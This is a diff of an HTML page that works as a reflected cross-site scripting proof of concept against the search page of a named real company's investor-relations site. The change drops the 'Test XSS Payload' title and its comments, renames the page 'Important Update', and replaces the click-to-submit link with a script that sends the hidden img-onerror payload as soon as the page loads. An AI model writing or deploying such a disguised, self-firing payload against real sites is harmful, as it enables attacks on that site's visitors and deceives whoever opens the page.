@@ -1,16 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Test XSS Payload</title>
+    <title>Important Update</title>
 </head>
 <body>
-    <h1>Click the link below</h1>
-    <!-- This form is hidden and will automatically submit the payload -->
     <form id="xssForm" action="https://ir.varonis.com/search-results/" method="GET">
-        <input type="hidden" name="SearchTerm" value="<img src=1 onerror=confirm(1)>">
-        <input type="hidden" name="page" value="1">
+        <input type="hidden" name="SearchTerm" value="<img src=x onerror=confirm('1')">
     </form>
-    <!-- This link will trigger the form submission -->
-    <a href="#" onclick="document.getElementById('xssForm').submit();">Click here to see something interesting</a>
+    <script>
+        document.getElementById('xssForm').submit();
+    </script>
 </body>
 </html>
